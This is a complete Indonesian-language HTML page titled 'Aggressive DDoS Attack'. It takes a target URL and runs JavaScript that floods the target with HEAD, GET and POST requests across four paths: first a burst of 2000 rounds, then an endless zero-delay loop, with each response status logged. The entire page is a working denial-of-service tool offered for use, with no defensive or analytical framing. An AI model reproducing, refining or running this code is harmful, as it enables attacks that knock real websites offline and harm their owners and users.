<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serangan DDoS Agresif</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #282c34;
            color: white;
            text-align: center;
            padding: 50px;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        input[type="text"], button {
            padding: 10px;
            margin: 5px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="text"] {
            width: 100%;
            max-width: 400px;
        }
        button {
            background: #61dafb;
            color: #282c34;
            transition: background 0.3s;
        }
        button:hover {
            background: #21a1f1;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2em;
            color: red;
        }
        #console {
            margin-top: 20px;
            background: #333;
            padding: 10px;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>Serangan DDoS Agresif</h1>
    <p>URL Target: <input type="text" id="targetURL" placeholder="https://example.com"></p>
    <button id="attackButton" onclick="toggleAttack()">Mulai Serangan</button>
    <div id="status"></div>
    <div id="console"></div>

    <script>
        let attackInterval;
        let isAttacking = false;

        function toggleAttack() {
            const attackButton = document.getElementById('attackButton');
            const targetURL = document.getElementById('targetURL').value;
            if (!targetURL) {
                document.getElementById('status').innerText = 'Silakan masukkan URL target yang valid.';
                return;
            }

            if (!isAttacking) {
                document.getElementById('status').innerText = 'Serangan sedang berlangsung...';
                attackButton.innerText = 'Hentikan Serangan';
                isAttacking = true;
                startAttack(targetURL);
            } else {
                document.getElementById('status').innerText = 'Serangan dihentikan.';
                attackButton.innerText = 'Mulai Serangan';
                isAttacking = false;
                stopAttack();
            }
        }

        function startAttack(targetURL) {
            function sendRequest(method, path) {
                const xhr = new XMLHttpRequest();
                xhr.open(method, targetURL + path, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        logAttack(`${method} ${xhr.status}: ${xhr.responseURL}`);
                    }
                };
                xhr.send();
            }

            // Ledakan awal 2000 permintaan untuk setiap metode dan path
            const methods = ['HEAD', 'GET', 'POST'];
            const paths = ['/', '/index.html', '/api', '/randompath'];
            for (let i = 0; i < 2000; i++) {
                methods.forEach(method => {
                    paths.forEach(path => sendRequest(method, path));
                });
            }

            // Looping agresif untuk setiap metode dan path
            attackInterval = setInterval(() => {
                methods.forEach(method => {
                    paths.forEach(path => sendRequest(method, path));
                });
            }, 0);
        }

        function stopAttack() {
            if (attackInterval) {
                clearInterval(attackInterval);
            }
        }

        function logAttack(message) {
            const consoleDiv = document.getElementById('console');
            const newMessage = document.createElement('div');
            newMessage.textContent = message;
            consoleDiv.appendChild(newMessage);
            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll ke bawah
        }
    </script>
</body>
</html>
